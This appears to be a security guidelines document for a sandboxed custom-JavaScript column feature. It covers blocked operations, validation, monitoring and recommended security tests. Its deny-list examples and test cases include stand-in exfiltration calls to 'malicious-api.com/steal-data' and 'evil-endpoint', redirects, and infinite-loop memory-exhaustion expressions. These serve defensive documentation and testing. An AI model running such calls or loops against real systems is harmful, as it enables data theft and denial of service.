# Security Guidelines - Custom JS Columns

## Security Model

The Custom JavaScript Columns feature implements a controlled execution environment designed to prevent malicious code execution while providing useful functionality.

## Execution Environment

### Sandboxed Context

Custom JavaScript executes in a limited context with only these objects available:

```javascript
{
  record: currentRowData,
  column: columnMetadata,
  Metadata: etendoMetadataAPI
}
```

### Blocked Operations

The following operations are prevented by the underlying execution framework:

#### DOM Access
```javascript
// ❌ BLOCKED
window.location.href = "malicious-site.com"
document.getElementById("sensitive-element")
localStorage.setItem("key", "value")
```

#### Network Requests
```javascript
// ❌ BLOCKED
fetch("https://malicious-api.com/steal-data")
new XMLHttpRequest()
navigator.sendBeacon("evil-endpoint", data)
```

#### Dynamic Code Execution
```javascript
// ❌ BLOCKED
eval("malicious code")
new Function("return malicious code")()
setTimeout("code string", 1000)
```

#### Module System Access
```javascript
// ❌ BLOCKED
import("malicious-module")
require("fs")
global.process
```

#### Timer Functions
```javascript
// ❌ BLOCKED
setTimeout(() => maliciousAction(), 1000)
setInterval(() => maliciousAction(), 1000)
setImmediate(() => maliciousAction())
```

## Safe Operations

### Allowed JavaScript Features

#### Data Access and Manipulation
```javascript
// ✅ SAFE
record.fieldName
record.amount * 1.21
record.firstName + " " + record.lastName
```

#### String Operations
```javascript
// ✅ SAFE
record.name.toUpperCase()
record.text.substring(0, 10)
record.value.toString()
```

#### Mathematical Operations
```javascript
// ✅ SAFE
Math.round(record.price * record.quantity)
Math.max(record.value1, record.value2)
Math.abs(record.difference)
```

#### Conditional Logic
```javascript
// ✅ SAFE
record.status === "active" ? "✅" : "❌"
record.amount > 1000 ? "High" : "Low"
```

#### Array Operations (on record properties)
```javascript
// ✅ SAFE (if record.items is an array)
record.items.length
record.items.map(item => item.name).join(", ")
record.tags.filter(tag => tag.active)
```

## Input Validation

### Automatic Validation

The system automatically:
- Limits execution time (prevents infinite loops)
- Restricts access to global objects
- Validates function syntax before execution
- Logs security violations for monitoring

### Content Restrictions

#### Prohibited Patterns
These patterns are blocked at the execution level:
- References to `window`, `document`, `global`
- Function constructor usage
- Dynamic import statements
- Timer function calls
- Network-related APIs

## Data Protection

### Sensitive Data Handling

#### Safe Data Access
```javascript
// ✅ SAFE - Only access provided record data
record.publicField
record.calculatedValue
record.displayName
```

#### Data Isolation
- Each evaluation receives only the specific record data
- No access to other records or global application state
- Column metadata is read-only
- No persistent state between evaluations

### Information Disclosure Prevention

#### Avoid Sensitive Field Exposure
```javascript
// ⚠️ CAUTION - Don't expose sensitive data in custom JS
record.password        // Don't include in custom JS context
record.apiKey         // Don't include in custom JS context
record.internalId     // Consider if this should be exposed
```

## Error Handling Security

### Safe Error Messages

The system sanitizes error messages to prevent information disclosure:

```javascript
// Original error (not shown to user)
"ReferenceError: Cannot access 'internalSystemVariable' of undefined"

// Sanitized error (shown to user)  
"[Error: Evaluation failed]"
```

### Error Logging

- Detailed errors logged server-side for debugging
- Client-side errors limited to generic messages
- No stack traces exposed to end users
- Security violations logged for monitoring

## Input Sanitization

### Expression Validation

Before execution, expressions are validated for:
- Syntax correctness
- Prohibited pattern detection
- Length limitations
- Character encoding issues

### Example Validation Flow

```typescript
// 1. Syntax validation
if (!isValidJavaScript(jsCode)) {
  return "[Error: Invalid syntax]";
}

// 2. Security pattern check  
if (containsProhibitedPatterns(jsCode)) {
  return "[Error: Prohibited operation]";
}

// 3. Safe execution
return await executeStringFunction(jsCode, safeContext, record);
```

## Monitoring and Auditing

### Security Event Logging

The system logs:
- Failed execution attempts
- Security violations
- Unusual evaluation patterns
- Error frequencies by expression

### Monitoring Recommendations

1. **Track Evaluation Failures**: High failure rates may indicate attack attempts
2. **Monitor Execution Time**: Unusually long executions could indicate malicious code
3. **Audit Expression Changes**: Log when custom JS expressions are modified
4. **Review Error Patterns**: Recurring errors might indicate security probes

## Best Practices for Developers

### Writing Secure Expressions

#### Do's ✅
```javascript
// Simple data access
"(record) => record.amount"

// Safe calculations
"(record) => record.price * record.quantity"

// Basic string operations
"(record) => record.firstName + ' ' + record.lastName"

// Conditional rendering
"(record) => record.status === 'active' ? '✅' : '❌'"
```

#### Don'ts ❌
```javascript
// Avoid complex logic
"(record) => { /* 50 lines of complex code */ }"

// Don't try to access globals
"(record) => window.someGlobalFunction()"

// Don't attempt network operations
"(record) => fetch('/api/endpoint')"

// Avoid dynamic evaluation
"(record) => eval(record.dynamicCode)"
```

### Security Code Review

When reviewing custom JS expressions:

1. **Verify Data Sources**: Ensure only safe record fields are accessed
2. **Check for Complexity**: Complex expressions may hide malicious intent
3. **Validate Logic**: Ensure business logic is appropriate
4. **Test Edge Cases**: Verify behavior with null/undefined values

## Incident Response

### Security Violation Detected

If malicious code is detected:

1. **Immediate**: Expression evaluation fails safely
2. **Logging**: Security event recorded with details
3. **Notification**: Development team alerted
4. **Investigation**: Review expression source and intent
5. **Mitigation**: Remove or modify problematic expression

### Recovery Procedures

In case of security issues:

1. **Disable Feature**: Temporarily disable custom JS evaluation
2. **Audit Expressions**: Review all existing custom JS expressions
3. **Update Security**: Enhance detection patterns if needed
4. **Re-enable**: Restore functionality after validation

## Security Testing

### Recommended Test Cases

```javascript
// Test blocked operations
"(record) => window.location = 'malicious-site.com'"
"(record) => eval('malicious code')"
"(record) => fetch('/steal-data')"

// Test resource exhaustion
"(record) => { while(true) {} }"
"(record) => { const arr = []; while(true) arr.push(new Array(1000)); }"

// Test information disclosure
"(record) => Object.keys(window)"
"(record) => JSON.stringify(global)"
```

### Automated Security Testing

Include these in your test suite:
- Malicious code pattern detection
- Resource exhaustion prevention
- Information disclosure prevention
- Error message sanitization

## Compliance Considerations

### Data Privacy

- Ensure custom JS expressions don't expose PII inappropriately
- Consider GDPR implications of custom data processing
- Review expressions for data retention compliance

### Security Frameworks

- SOC 2 Type II considerations for code execution
- OWASP guidelines for input validation
- ISO 27001 requirements for secure development

## Future Security Enhancements

### Planned Improvements (Phase 3)

1. **Enhanced Validation**: More sophisticated pattern detection
2. **Resource Limits**: CPU and memory usage constraints  
3. **Audit Trail**: Complete expression change history
4. **Security Scanning**: Automated malicious pattern detection

### Monitoring Enhancements

1. **Real-time Alerts**: Immediate notification of security events
2. **Behavioral Analysis**: Detect unusual expression patterns
3. **User Activity Tracking**: Monitor who creates/modifies expressions

## Contact Information

For security concerns or questions:
- **Security Team**: security@etendo.com
- **Development Team**: dev-team@etendo.com
- **Emergency Contact**: security-emergency@etendo.com

## Security Disclosure

If you discover a security vulnerability:
1. **Do NOT** disclose publicly
2. **Contact** security team immediately
3. **Provide** detailed reproduction steps
4. **Await** response before any disclosure
